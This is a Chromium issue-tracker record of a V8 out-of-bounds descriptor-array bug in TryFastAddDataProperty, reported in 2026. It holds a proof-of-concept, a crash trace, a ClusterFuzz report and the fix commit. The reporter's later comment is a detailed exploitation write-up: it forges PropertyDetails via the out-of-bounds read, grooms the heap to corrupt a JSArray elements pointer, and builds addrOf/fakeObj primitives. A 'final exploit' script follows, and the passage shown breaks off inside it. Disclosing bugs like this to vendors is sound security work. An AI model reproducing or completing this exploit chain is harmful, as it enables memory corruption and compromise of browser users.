# V8 TryFastAddDataProperty descriptor-array OOB access

| Field | Value |
|-------|-------|
| **Issue ID** | [506689381](https://issues.chromium.org/issues/506689381) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | le...@chromium.org |
| **Created** | 2026-04-27 |
| **Bounty** | $55,000.00 |

## Description

## REPRODUCE

poc.js:

```
let key = "AA";
let value = 2;
class C extends Function {
    [key] = value;
}
for (let i = 0; i < 5; i++) {
    function f() {
        value = +f;
    }
    new C("'use strict'");
    f();
}

```

V8 must be built with a debug configuration. Execute v8 as follows:

```
../x64.debug/d8 \
    ./poc.js

```

This will result in the following crash:

```
#
# Fatal error in ../../src/objects/descriptor-array-inl.h, line 282
# Debug check failed: descriptor_number.as_int() < number_of_descriptors() (3 vs. 0).
#
#
#
#FailureMessage Object: 0x7fffffffb088
==== C stack trace ===============================

    ../x64.debug/d8(v8::base::debug::StackTrace::StackTrace()+0x29) [0x555565fedbe9]
    ../x64.debug/d8(+0x10a94acd) [0x555565fe8acd]
    ../x64.debug/d8(v8::base::PrintStackTraceIfAvailable()+0x14) [0x555565fc3444]
    ../x64.debug/d8(V8_Fatal(char const*, int, char const*, ...)+0x1f9) [0x555565fc3bf9]
    ../x64.debug/d8(+0x10a6f4bc) [0x555565fc34bc]
    ../x64.debug/d8(V8_Dcheck(char const*, int, char const*)+0x4d) [0x555565fc3cfd]
    ../x64.debug/d8(v8::internal::DescriptorArray::GetDetails(v8::internal::InternalIndex)+0x67) [0x55555f5e5857]
    ../x64.debug/d8(+0xb0757a4) [0x5555605c97a4]
    ../x64.debug/d8(v8::internal::JSObject::CreateDataProperty(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSObject>, v8::internal::PropertyKey, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>)+0x7d) [0x5555605b733d]
    ../x64.debug/d8(v8::internal::JSReceiver::CreateDataProperty(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSReceiver>, v8::internal::PropertyKey, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>)+0xd8) [0x5555605ad5f8]
    ../x64.debug/d8(v8::internal::JSReceiver::CreateDataProperty(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::PropertyKey, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>)+0x146) [0x5555605b72a6]
    ../x64.debug/d8(v8::internal::Runtime::DefineObjectOwnProperty(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin)+0x58a) [0x555560aea4ba]
    ../x64.debug/d8(+0xb59a851) [0x555560aee851]
    ../x64.debug/d8(v8::internal::Runtime_DefineObjectOwnProperty(int, unsigned long*, v8::internal::Isolate*)+0x129) [0x555560aee669]
    ../x64.debug/d8(+0xfa73d3d) [0x555564fc7d3d]

```

CREDIT INFORMATION

Reporter credit: [303f06e3]

## Timeline

### hu...@gmail.com (2026-04-27)

Here is a clearer POC

```
let key = "AA";
let value = 2;
class C extends Function {
    [key] = value;
}

/*
    before [key] = value: 
        o1->map=MapA
        MapA properties: {length, name, prototype}

    after [key] = value: 
        o1->map=MapB
        MapB properties: {length, name, prototype, AA}
        map transition: MapA----(AA, kData, SMI)--->MapB
*/
let o1 = new C("'use strict'");


value = 1.1;
/*
    [key] = value will trigger TryFastAddDataProperty() when create o2
    TryFastAddDataProperty() found map transition: MapA----(AA, kData, SMI)--->MapB

*/
let o2 = new C("'use strict'");

```

On the second `new C("...")`, the constructor first creates a `Function` object, then calls `TryFastAddDataProperty()` to add the property (`[key] = value;`). The crash occurs there.

```
bool TryFastAddDataProperty(Isolate* isolate, DirectHandle<JSObject> object,
                            DirectHandle<Name> name, DirectHandle<Object> value,
                            PropertyAttributes attributes) {
  // Search for map transition
  Tagged<Map> map =
      TransitionsAccessor(isolate, object->map())
          .SearchTransition(*name, PropertyKind::kData, attributes);
  if (map.is_null()) return false; // map transition not found

  DirectHandle<Map> new_map(map, isolate);
  if (map->is_deprecated()) {
    new_map = Map::Update(isolate, new_map);
    if (new_map->is_dictionary_map()) return false;
  }

  // Get the index of the last descriptor, i.e., the "AA" property
  InternalIndex descriptor = new_map->LastAdded();
  // Adjust the map so that it can write value into the descriptor field
  new_map = Map::PrepareForDataProperty(isolate, new_map, descriptor,
                                        PropertyConstness::kConst, value);
  // Migrate the object's memory layout according to new_map
  JSObject::MigrateToMap(isolate, object, new_map);
  // Write the field into the object
  object->WriteToField(descriptor,
                       new_map->instance_descriptors()->GetDetails(descriptor),
                       *value);
  return true;
}

```

`TryFastAddDataProperty()`:

1. Finds this map transition: `MapA----(AA, kData, SMI)--->MapB`
2. Calls `Map::PrepareForDataProperty()` to adjust `MapB` so that it can write `value` into the `descriptor` field.

The problem occurs in `Map::PrepareForDataProperty()`: now the `"AA"` property is a float, but the original `MapB` records the `"AA"` property as `SMI`. Therefore, `Map::PrepareForDataProperty()` returns a brand new `MapC` as follows:

```
0x13a80103ae71: [Map] in OldSpace
 - map: 0x13a801020e95 <MetaMap (0x13a801020ee5 <NativeContext[307]>)>
 - type: JS_FUNCTION_WITH_PROTOTYPE_TYPE
 - instance size: 32
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - dictionary_map
 - may_have_interesting_properties
 - callable
 - constructor
 - back pointer: 0x13a800000011 <undefined>
 - prototype_validity_cell: 0x13a800000af1 <Cell value= [cleared]>
 - instance descriptors (own) #0: 0x13a80000080d <DescriptorArray[0]>
 - prototype: 0x13a80104b6ad <C map = 0x13a80103adbd>
 - constructor: 0x13a8010215b5 <JSFunction Function (sfi = 0x13a8008b8b6d)>
 - dependent code: 0x13a8000007f5 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
gef➤  job 0x13a80000080d
0x13a80000080d: [DescriptorArray] in ReadOnlySpace
 - map: 0x13a800000745 <Map(DESCRIPTOR_ARRAY_TYPE)>
 - enum_cache: empty
 - nof slack descriptors: 0
 - nof descriptors: 0
 - raw gc state: mc epoch 0, marked 0, delta 0
 - fast iterable state: JSON fast

```

`MapC` is a dictionary map, its descriptor array is empty, so the `descriptor` index is invalid for `MapC`, causing an out-of-bounds access in `new_map->instance_descriptors()->GetDetails(descriptor)`.

The root cause seems to be that `TryFastAddDataProperty()` misuses `Map::PrepareForDataProperty()`. `Map::PrepareForDataProperty()` may return a dictionary map, while `descriptor` is an index in the obsolete map, and should not be used on the new map.

### ch...@google.com (2026-04-28)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### cl...@appspot.gserviceaccount.com (2026-04-28)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6418833690624000.

### ar...@google.com (2026-04-28)

Thanks for the report. I was able to reproduce this locally and also on CF, I noticed that on release builds it doesn't crash do you have a PoC that crashes on release builds too?

### 24...@project.gserviceaccount.com (2026-04-28)

Detailed Report: https://clusterfuzz.com/testcase?key=6418833690624000

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  descriptor_number.as_int() < number_of_descriptors() in descriptor-array-inl.h
  v8::internal::DescriptorArray::GetDetails
  v8::internal::TryFastAddDataProperty
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=92888:92889

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6418833690624000

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### ar...@google.com (2026-04-29)

Bisects to [crrev.com/c/5378402](https://crrev.com/c/5378402), Leszek CYPTAL?

### ch...@google.com (2026-04-29)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-04-29)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### dx...@google.com (2026-05-04)

Project: v8/v8  

Branch:  main  

Author:  Leszek Swirski [leszeks@chromium.org](mailto:leszeks@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7807043>

[objects] Abort TryFastAddDataProperty if map becomes slow

---


Expand for full commit details
```
     
    When class fields are added to a constructor-created function object 
    when the class extends Function, TryFastAddDataProperty is invoked 
    to perform a fast transition. However, Map::PrepareForDataProperty may 
    instead normalize the map and return a slow dictionary map. 
     
    This CL fixes the issue by aborting the fast transition in 
    TryFastAddDataProperty and returning false if 
    Map::PrepareForDataProperty returns a dictionary map, falling back 
    to the standard slow property addition path. 
     
    TAG=agy 
    CONV=7233c224-ccbc-421c-88b3-34be1f425294 
     
    Change-Id: If323afa0297782cd7a13efb02368e0dfdec00707 
    Fixed: 506689381 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7807043 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Reviewed-by: Igor Sheludko <ishell@chromium.org> 
    Auto-Submit: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#107009}

```

---

Files:

- M `src/objects/js-objects.cc`
- A `test/mjsunit/regress/regress-crbug-506689381.js`

---

Hash: [3c869652b039fc1fc9fbe035c6af879317e8b9f3](https://chromiumdash.appspot.com/commit/3c869652b039fc1fc9fbe035c6af879317e8b9f3)  

Date: Mon May 4 10:27:58 2026


---

### 24...@project.gserviceaccount.com (2026-05-05)

ClusterFuzz testcase 6418833690624000 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=107008:107009

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### hu...@gmail.com (2026-05-06)

## 1 Bug Overview

`TryFastAddDataProperty()` contains a logic flaw in its handling of map transitions. Its processing is as follows:

1. `PrepareForDataProperty` converts `new_map` into a Dictionary Map.
2. `JSObject::MigrateToMap()` allocates a new `NameDictionary` object in new space as the object's `properties`.
3. `new_map->instance_descriptors()->GetDetails(descriptor)` still treats the map as fast-mode properties, attempting to read `PropertyDetails` from the `DescriptorArray`.
4. `object->WriteToField(...)` uses the read `PropertyDetails` to determine the write location, then writes `value` at that position.

```
bool TryFastAddDataProperty(Isolate* isolate, DirectHandle<JSObject> object,
                            DirectHandle<Name> name, DirectHandle<Object> value,
                            PropertyAttributes attributes) {
  ...

  // Get the index of the last descriptor, which corresponds to the "AA" property.
  // Since new_map was transitioned from the old Map by adding property `name`,
  // the last descriptor is exactly the one corresponding to property `name`.
  // Maps form a linear chain where each transition appends one property
  // to the end of the DescriptorArray.
  InternalIndex descriptor = new_map->LastAdded();
  // Adjust the map so it can store `value` in the descriptor field.
  new_map = Map::PrepareForDataProperty(isolate, new_map, descriptor,
                                        PropertyConstness::kConst, value);
  // Migrate the object's memory layout according to new_map.
  JSObject::MigrateToMap(isolate, object, new_map);
  // Write the field value into the object.
  object->WriteToField(descriptor,
                       new_map->instance_descriptors()->GetDetails(descriptor),
                       *value);
  return true;
}

```

The key question is: what does `GetDetails(descriptor)` actually read? This determines the exploitation primitive.

## 2 OOB Reading from an Empty DescriptorArray

A Dictionary Map does not hold a `DescriptorArray`. All property information is recorded in the object's `properties` field. Therefore, `instance_descriptors()` points to an empty `DescriptorArray[0]` located in ReadOnly Space.

```
0x9b801024c61: [Map] in OldSpace
 - type: JS_FUNCTION_WITH_PROTOTYPE_TYPE
 - instance size: 32
 - inobject properties: 0
 - dictionary_map
 - instance descriptors (own) #0: 0x09b80000080d <DescriptorArray[0]>    // <====
 - ...

```

The `DescriptorArray[0]` has a 20-byte header. Each subsequent `Entry` consists of three 4-byte fields: `key`, `details`, and `value`.

```
struct Entry {
  TaggedMember<UnionOf<Name, Undefined>> key;
  TaggedMember<UnionOf<Smi, Undefined>> details;
  TaggedMember<UnionOf<JSAny, Weak<Map>, AccessorInfo, AccessorPair,
                       ClassPositions, NumberDictionary>>
      value;
};

```

By controlling the number of computed properties in `class C`, we can control the out-of-bounds read index `descriptor`. Let this index be `X`. Then `GetDetails(descriptor)` reads a 4-byte word from:

```
DescriptorArray[0]_addr + HeaderSize + EntrySize * X + offset(details, Entry)

=> DescriptorArray[0]_addr + 20 + 12 * X + 4

```

and interprets it as a `PropertyDetails` field.

The content in ReadOnly Space is highly stable, unaffected by ASLR, and loaded from the V8 snapshot at startup. Its content is rich and deterministic, giving us a limited ability to "forge" `PropertyDetails` via the OOB read.

Therefore, the next step is to analyze what kind of `PropertyDetails` we need to achieve a useful write primitive.

## 3 How PropertyDetails Controls the OOB Write

Next, we examine how `WriteToField()` uses the forged `PropertyDetails`.

The two critical fields in `PropertyDetails` that affect `WriteToField()` are:

1. **`OffsetInWordsField`**: bits 19-29, representing the field offset in words. Controlling this field allows controlling the OOB write offset.
2. **`InObjectField`**: bit 30, indicating whether this is an in-object property.

```
class PropertyDetails {
  ...
  // 11-bit field storing the offset in words.
  using OffsetInWordsField =
      DescriptorPointer::Next<uint16_t, kDescriptorIndexBitCount + 1>;
  using InObjectField = OffsetInWordsField::Next<bool, 1>;
  ...
  uint16_t field_offset() const { return OffsetInWordsField::decode(value_); }
}

```

`WriteToField()` calls `FieldIndex::ForDetails()` to convert the `PropertyDetails` into a `FieldIndex`, then calls `FastPropertyAtPut()` to perform the property write:

```
void JSObject::WriteToField(
    InternalIndex descriptor,
    PropertyDetails details,
    Tagged<Object> value
  ) {
  DisallowGarbageCollection no_gc;
  FieldIndex index = FieldIndex::ForDetails(map(), details);
  if (details.representation().IsDouble()) {
    ...
  } else {
    FastPropertyAtPut(index, value);
  }
}

```

The write target depends on the `InObject` flag:

- If it is an in-object property: `obj + offset_in_words * 4 = value`
- Otherwise write in properties backing storage: `obj->properties[index] = value`

```
void JSObject::FastPropertyAtPut(FieldIndex index, Tagged<Object> value,
                                 WriteBarrierMode mode) {
  if (index.is_inobject()) {
    RawFastInobjectPropertyAtPut(index, value, mode);
  } else {
    property_array()->set(index.outobject_array_index(), value);
  }
}

```

These represent two different exploitation paths. Which one should we choose?

## 4 In-Object vs Out-of-Object Property Write

If we choose to write to `obj->properties`, we face a problem: `obj->properties` is a `NameDictionary` object freshly allocated from new space during the `JSObject::MigrateToMap()` call. Since `WriteToField()` is invoked immediately afterward, there is no opportunity for heap spraying between the allocation and the write. Even if `obj->properties[index] = value` writes out-of-bounds, it would only overwrite empty space after the newly allocated object, producing no useful effect.

Furthermore, this problem cannot be solved through heap feng shui: objects allocated from new space always appear at higher memory addresses, making it impossible to place the `NameDictionary` object before an existing target object.

If instead we choose to write to `obj + offset_in_words * 4` (in-object property), the problem is solved:

1. The `JSFunction` object corresponding to `obj` is the first object allocated during `new C()`.
2. When processing computed properties like `[F_n] = [1.1, ..., 1.1]`, V8 allocates float arrays immediately after the `JSFunction` in new space, allowing us to heap-spray adjacent objects.
3. When processing `[key] = value` triggers the bug, `WriteToField()` writes beyond `obj`, hitting the heap-sprayed `JSArray` objects placed right after it.

Based on this analysis, the forged `PropertyDetails` must satisfy:

1. **`InObject = 1`** (bit 30 set) — mandatory.
2. **`OffsetInWords`** — a moderate value, avoiding writes that are too far away.
3. **`Representation != kDouble`**: to avoid entering the `if (details.representation().IsDouble()) {` branch.

Since `PropertyDetails` is stored as a Smi (shifted left by 1 bit when stored, shifted right by 1 when read), our target is to find a word at position `DescriptorArray[0]_addr + 20 + 12*X + 4` whose value is greater than `0x80000000` (so that bit 30 is set after the Smi shift).

Using GDB, a suitable word was found at `X=129`:

```
xmem 0x09b80000080d-1+20 200
descriptor     key      details     value
....
[128]       0x00000006 0x676e656c 0x00006874
[129]       0x00000155 0x9177b65a 0x0000000a
...

```

`0x9177b65a >> 1 = 0x48bbdb2d`, which decodes to `offset_in_words=279, in_object=1`. This gives us the ability to write a `HeapNumber(1.1)` object pointer at offset `279 * 4 = 0x45c` from the `JSFunction` object.

The remaining task is to adjust the heap spray to align the target at exactly this offset.

## 5 Heap Feng Shui

The memory layout during `new C()` execution follows the allocation order in new space:

1. The `JSFunction` object is allocated first, then computed properties are processed sequentially.
2. `[F0]` through `[F116]`: these values are written directly into the `JSFunction`'s in-object properties.
3. `[F119] = [1.2, 1.1, 1.1, 1.1, 1.1]`:
   1. A `FixedDoubleArray` object is allocated.
   2. A `JSArray` object is allocated.
   3. The `JSArray` pointer is written into the `JSFunction`'s in-object property.
4. When processing `[key] = value`, the bug is triggered:
   1. A `HeapNumber` object is allocated for `1.1`, then execution enters `TryFastAddDataProperty()`.
   2. `PrepareForDataProperty()` converts the map to a dictionary map.
   3. `MigrateToMap()` allocates a `NameDictionary` for `JSFunction::properties`.
   4. `instance_descriptors()->GetDetails(descriptor)` performs the OOB read in ReadOnly Space, obtaining `PropertyDetails{offset_in_words=279, in_object=1}`.
   5. `o2->WriteToField()` writes the `HeapNumber(1.1)` pointer to `o2 + 0x45C`.

```
                  NewSpace

  JSFunction   +----------------+
     `o2`      |       map      |
               |    properties  |-------+
               |      ...       |       |
               |   in-obj prop0 |       |
               |   in-obj prop1 |       |
               |      ...       |       |
               +----------------+       |
FixedDoubleArr |      map       | <-+   |
               |     length     |   |   |
               |   0x9999999a   |   |   |
               |   0x3ff19999   |   |   |
               |   0x9999999a   |   |   |
               |   0x3ff19999   |   |   |
               |     ......     |   |   |
               +----------------+   |   |
    JSArray    |      map       |   |   |
  `evilArr`    |    properties  |   |   |
               |    elements    |---+   |
               |     length     |       |
               +----------------+       |
    Spray      |                |       |
 May [1.1,...] |    ......      |       |
               |                |       |
               +----------------+       |
  HeapNumber   |       map      |       |
    1.1        |   0x9999999a   |       |
               |   0x3ff19999   |       |
               +----------------+       |
NameDictionary |      map       | <-----+
               |    length      |
               |   num_of_ele   |
               |    ...         |
               |Entry[i].key    |
               |Entry[i].value  |
               |Entry[i].details|
               |     ...        |
               +----------------+
               |                |
               |     ......     |
               |                |
               +----------------+

```

By adjusting the offset, `o2->WriteToField()` writes the `HeapNumber(1.1)` pointer into `evilArr`'s `JSArray::elements` field. This causes the `HeapNumber` object to be interpreted as a `FixedDoubleArray` with length `0x10`, overlapping with the subsequent `NameDictionary` and creating a heap overlapping primitive.

- Writing a pointer as a float64 via `evilArr` into `NameDictionary::Entry[i].value` implements **fakeObj**.
- Placing an object into `NameDictionary::Entry[i].value` and reading it as a float64 via `evilArr` implements **addrOf**.

```
                  NewSpace

  JSFunction   +----------------+
   `o2`        |       map      |
               |    properties  |-------+
               |      ...       |       |
               |   in-obj prop0 |       |
               |   in-obj prop1 |       |
               |      ...       |       |
               +----------------+       |
FixedDoubleArr |      map       |       |
               |     length     |       |
               |   0x9999999a   |       |
               |   0x3ff19999   |       |
               |   0x9999999a   |       |
               |   0x3ff19999   |       |
               |     ......     |       |
               +----------------+       |
    JSArray    |      map       |       |
  `evilArr`    |    properties  |       |
               |    elements    |---+   |  <=== o2 + 0x45c overwritten
               |     length     |   |   |
               +----------------+   |   |
    Spray      |                |   |   |
 May [1.1,...] |    ......      |   |   |
               |                |   |   |
               +----------------+   |   |
  HeapNumber   |       map      | <-+   |
    1.1        |   0x9999999a   |       |
               |   0x3ff19999   |       |
               +----------------+       |
NameDictionary |      map       | <-----+
               |    length      |
               |   num_of_ele   |
               |    ...         |
               |Entry[i].key    |
               |Entry[i].value  |
               |Entry[i].details|
               |     ...        |
               +----------------+
               |                |
               |     ......     |
               |                |
               +----------------+

```
## 6 Final Exploit

The final exploit is shown below. It requires no GC trigger, no race condition, no JIT warmup, and no unstable factors. The heap feng shui only requires adjacent object placement, achieving a 100% success rate.

This is a remarkably elegant vulnerability that existed for a long time — one of the best I've seen in a while.

```

var f64 = new Float64Array(1);   
var bigUint64 = new BigUint64Array(f64.buffer); 
var u32 = new Uint32Array(f64.buffer);

let F0 = "F0";
let V0 = 0;
let F1 = "F1";
let V1 = 1;
let F2 = "F2";
let V2 = 2;
let F3 = "F3";
let V3 = 3;
let F4 = "F4";
let V4 = 4;
let F5 = "F5";
let V5 = 5;
let F6 = "F6";
let V6 = 6;
let F7 = "F7";
let V7 = 7;
let F8 = "F8";
let V8 = 8;
let F9 = "F9";
let V9 = 9;
let F10 = "F10";
let V10 = 10;
let F11 = "F11";
let V11 = 11;
let F12 = "F12";
let V12 = 12;
let F13 = "F13";
let V13 = 13;
let F14 = "F14";
let V14 = 14;
let F15 = "F15";
let V15 = 15;
let F16 = "F16";
let V16 = 16;
let F17 = "F17";
let V17 = 17;
let F18 = "F18";
let V18 = 18;
let F19 = "F19";
let V19 = 19;
let F20 = "F20";
let V20 = 20;
let F21 = "F21";
let V21 = 21;
let F22 = "F22";
let V22 = 22;
let F23 = "F23";
let V23 = 23;
let F24 = "F24";
let V24 = 24;
let F25 = "F25";
let V25 = 25;
let F26 = "F26";
let V26 = 26;
let F27 = "F27";
let V27 = 27;
let F28 = "F28";
let V28 = 28;
let F29 = "F29";
let V29 = 29;
let F30 = "F30";
let V30 = 30;
let F31 = "F31";
let V31 = 31;
let F32 = "F32";
let V32 = 32;
let F33 = "F33";
let V33 = 33;
let F34 = "F34";
let V34 = 34;
let F35 = "F35";
let V35 = 35;
let F36 = "F36";
let V36 = 36;
let F37 = "F37";
let V37 = 37;
let F38 = "F38";
let V38 = 38;
let F39 = "F39";
let V39 = 39;
let F40 = "F40";
let V40 = 40;
let F41 = "F41";
let V41 = 41;
let F42 = "F42";
let V42 = 42;
let F43 = "F43";
let V43 = 43;
let F44 = "F44";
let V44 = 44;
let F45 = "F45";
let V45 = 45;
let F46 = "F46";
let V46 = 46;
let F47 = "F47";
let V47 = 47;
let F48 = "F48";
let V48 = 48;
let F49 = "F49";
let V49 = 49;
let F50 = "F50";
let V50 = 50;
let F51 = "F51";
let V51 = 51;
let F52 = "F52";
let V52 = 52;
let F53 = "F53";
let V53 = 53;
let F54 = "F54";
let V54 = 54;
let F55 = "F55";
let V55 = 55;
let F56 = "F56";
let V56 = 56;
let F57 = "F57";
let V57 = 57;
let F58 = "F58";
let V58 = 58;
let F59 = "F59";
let V59 = 59;
let F60 = "F60";
let V60 = 60;
let F61 = "F61";
let V61 = 61;
let F62 = "F62";
let V62 = 62;
let F63 = "F63";
let V63 = 63;
let F64 = "F64";
let V64 = 64;
let F65 = "F65";
let V65 = 65;
let F66 = "F66";
let V66 = 66;
let F67 = "F67";
let V67 = 67;
let F68 = "F68";
let V68 = 68;
let F69 = "F69";
let V69 = 69;
let F70 = "F70";
let V70 = 70;
let F71 = "F71";
let V71 = 71;
let F72 = "F72";
let V72 = 72;
let F73 = "F73";
let V73 = 73;
let F74 = "F74";
let V74 = 74;
let F75 = "F75";
let V75 = 75;
let F76 = "F76";
let V76 = 76;
let F77 = "F77";
let V77 = 77;
let F78 = "F78";
let V78 = 78;
let F79 = "F79";
let V79 = 79;
let F80 = "F80";
let V80 = 80;
let F81 = "F81";
let V81 = 81;
let F82 = "F82";
let V82 = 82;
let F83 = "F83";
let V83 = 83;
let F84 = "F84";
let V84 = 84;
let F85 = "F85";
let V85 = 85;
let F86 = "F86";
let V86 = 86;
let F87 = "F87";
let V87 = 87;
let F88 = "F88";
let V88 = 88;
let F89 = "F89";
let V89 = 89;
let F90 = "F90";
let V90 = 90;
let F91 = "F91";
let V91 = 91;
let F92 = "F92";
let V92 = 92;
let F93 = "F93";
let V93 = 93;
let F94 = "F94";
let V94 = 94;
let F95 = "F95";
let V95 = 95;
let F96 = "F96";
let V96 = 96;
let F97 = "F97";
let V97 = 97;
let F98 = "F98";
let V98 = 98;
let F99 = "F99";
let V99 = 99;
let F100 = "F100";
let V100 = 100;
let F101 = "F101";
let V101 = 101;
let F102 = "F102";
let V102 = 102;
let F103 = "F103";
let V103 = 103;
let F104 = "F104";
let V104 = 104;
let F105 = "F105";
let V105 = 105;
let F106 = "F106";
let V106 = 106;
let F107 = "F107";
let V107 = 107;
let F108 = "F108";
let V108 = 108;
let F109 = "F109";
let V109 = 109;
let F110 = "F110";
let V110 = 110;
let F111 = "F111";
let V111 = 111;
let F112 = "F112";
let V112 = 112;
let F113 = "F113";
let V113 = 113;
let F114 = "F114";
let V114 = 114;
let F115 = "F115";
let V115 = 115;
let F116 = "F116";
let V116 = 116;
let F117 = "F117";
let V117 = 117;
let F118 = "F118";
let V118 = 118;
let F119 = "F119";
let V119 = 119;
let F120 = "F120";
let V120 = 120;
let F121 = "F121";
let V121 = 121;
let F122 = "F122";
let V122 = 122;
let F123 = "F123";
let V123 = 123;
let F124 = "F124";
let V124 = 124;
let F125 = "F125";
let V125 = 125;
let F126 = "F126";
let V126 = 126;
let F127 = "F127";
let V127 = 127;
let F128 = "F128";
let V128 = 128;

let key = "AA";
let value = 2;
class C extends Function {
    // Add many computed properties to increase the descriptor index
    // in TryFastAddDataProperty(), controlling the OOB read offset.
    [F0] = V0;
    [F1] = V1;
    [F2] = V2;
    [F3] = V3;
    [F4] = V4;
    [F5] = V5;
    [F6] = V6;
    [F7] = V7;
    [F8] = V8;
    [F9] = V9;
    [F10] = V10;
    [F11] = V11;
    [F12] = V12;
    [F13] = V13;
    [F14] = V14;
    [F15] = V15;
    [F16] = V16;
    [F17] = V17;
    [F18] = V18;
    [F19] = V19;
    [F20] = V20;
    [F21] = V21;
    [F22] = V22;
    [F23] = V23;
    [F24] = V24;
    [F25] = V25;
    [F26] = V26;
    [F27] = V27;
    [F28] = V28;
    [F29] = V29;
    [F30] = V30;
    [F31] = V31;
    [F32] = V32;
    [F33] = V33;
    [F34] = V34;
    [F35] = V35;
    [F36] = V36;
    [F37] = V37;
    [F38] = V38;
    [F39] = V39;
    [F40] = V40;
    [F41] = V41;
    [F42] = V42;
    [F43] = V43;
    [F44] = V44;
    [F45] = V45;
    [F46] = V46;
    [F47] = V47;
    [F48] = V48;
    [F49] = V49;
    [F50] = V50;
    [F51] = V51;
    [F52] = V52;
    [F53] = V53;
    [F54] = V54;
    [F55] = V55;
    [F56] = V56;
    [F57] = V57;
    [F58] = V58;
    [F59] = V59;
    [F60] = V60;
    [F61] = V61;
    [F62] = V62;
    [F63] = V63;
    [F64] = V64;
    [F65] = V65;
    [F66] = V66;
    [F67] = V67;
    [F68] = V68;
    [F69] = V69;
    [F70] = V70;
    [F71] = V71;
    [F72] = V72;
    [F73] = V73;
    [F74] = V74;
    [F75] = V75;
    [F76] = V76;
    [F77] = V77;
    [F78] = V78;
    [F79] = V79;
    [F80] = V80;
    [F81] = V81;
    [F82] = V82;
    [F83] = V83;
    [F84] = V84;
    [F85] = V85;
    [F86] = V86;
    [F87] = V87;
    [F88] = V88;
    [F89] = V89;
    [F90] = V90;
    [F91] = V91;
    [F92] = V92;
    [F93] = V93;
    [F94] = V94;
    [F95] = V95;
    [F96] = V96;
    [F97] = V97;
    [F98] = V98;
    [F99] = V99;
    [F100] = V100;
    [F101] = V101;
    [F102] = V102;
    [F103] = V103;
    [F104] = V104;
    [F105] = V105;
    [F106] = V106;
    [F107] = V107;
    [F108] = V108;
    [F109] = V109;
    [F110] = V110;
    [F111] = V111;
    [F112] = V112;
    [F113] = V113;
    [F114] = V114;
    [F115] = V115;
    [F116] = V116;

    /*
        Heap spray section (also increases the OOB read index)
    */
    [F117] = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16];
    [F118] = [2, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14];
    [F119] = [1.2, 1.1, 1.1, 1.1, 1.1];
    [F120] = [1.3, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1];
    [F121] = [1.4, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1];
    [F122] = [1.5, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1];  // <=== Hit this array
    [F123] = [1.6, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1];
    [F124] = [1.7, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1];
    [F125] = [1.8, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1];
    

    [key] = value;
}

/*
    before [key] = value: 
        o1->map=MapA
        MapA properties: {length, name, prototype}

    after [key] = value: 
        o1->map=MapB
        MapB properties: {length, name, prototype, AA}
        map transition: MapA----(AA, kData, SMI)--->MapB
*/
let o1 = new C("'use strict'");



/*
    [key] = value will trigger TryFastAddDataProperty() when create o2
